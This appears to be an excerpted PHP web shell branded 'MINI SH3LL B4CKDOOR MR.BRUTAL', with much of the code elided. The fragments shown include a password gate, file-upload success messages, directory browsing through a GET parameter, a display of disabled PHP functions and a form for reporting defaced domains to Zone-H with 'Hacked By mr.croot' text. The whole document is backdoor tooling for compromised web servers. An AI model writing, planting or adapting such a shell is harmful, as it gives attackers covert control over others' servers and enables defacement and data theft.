...
if($_POST['password'] == $pass) {
  ...
  echo "<script>window.location='?mini shell mr.croot'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
...
?>
<title><= MINI SH3LL B4CKDOOR MR.BRUTAL =></title>
...
<html>
<head>
	<title><= MINI SH3LL B4CKDOOR MR.CROO =></title>
</head>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<body bgcolor="black">
	<center><img src="https://e.top4top.io/p_2062jealu1.jpeg" style="opacity:0.5; width:200px; height:300px";></center>
	<center><h1><center><font color="red" face="Patrick Hand">-=[ welcome to</font><font color="white" face="Patrick Hand"> my shell brutal ]=-</font>
</center>
...
<title><= MINI SHELL PRIVATE MR.BRUTAL =></title>
<style>
...
body{
	...
	background-image: url("https://h.top4top.io/p_17095tg9v0.jpeg");
	color:White;
...
<body>
<center><br><img src="https://e.top4top.io/p_2062jealu1.jpeg"width="300"height="300">
<br>
<center><font size="5" color="red" face="Patrick Hand"><h2><= MINI SH3LL B4CKDOOR MR.BRUTAL =></h2></font>
</center>
...
echo '<font color="white">Berhasil Tot !</font><br />';
}else{
echo '<font color="red">Gagal Tot !</font><br/>';
}
}
	if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
...
$show_ds = (!empty($ds)) ? "<font color=#00FFFF>$ds</font>" : "<font color=#00FF66>Masih Perawan !</font>";
...
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Reineganz_sadboy05'><br>
		<u>Domains</u>: <br>
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By mr.croot</textarea><br>
...
echo '<center><br/>#GRAYHAT TERSAKITI TEAM</center>
</body>
</html>';
function perms($file){
